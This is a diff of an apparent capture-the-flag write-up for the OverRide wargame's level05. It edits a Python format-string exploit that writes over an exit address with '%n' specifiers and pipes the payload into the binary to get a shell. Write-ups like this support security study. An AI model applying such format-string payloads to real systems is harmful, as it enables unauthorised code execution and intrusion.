@@ -172,11 +172,6 @@ import struct
 exit_addr = struct.pack ("I", 0x80497e0)
 exit_addr += struct.pack ("I", 0x80497e0 + 2)
 print exit_addr  + "%56984d%10$n" + "%8543d%11$n"
-
-python /tmp/pyload.py > /tmp/pyload
-level05@OverRide:~$ cat /tmp/pyload
-%56984d%10$n%8543d%11$n
-level05@OverRide:~$ (cat /tmp/pyload; cat) | ./level05 > /dev/null
 ```
 
 more organized syntax
@@ -197,7 +192,7 @@ print exit_addr  + "%" + str(shell_lsb - 8) + "d%10$hn" + "%" + str(shell_msb - 
 ```
 
 ```
-python /tmp/pyload.py > /tmp/pyload
+level05@OverRide:~$ python /tmp/pyload.py > /tmp/pyload
 
 level05@OverRide:~$ (cat /tmp/pyload; cat) | ./level05 > /dev/null
 pwd 1>&2
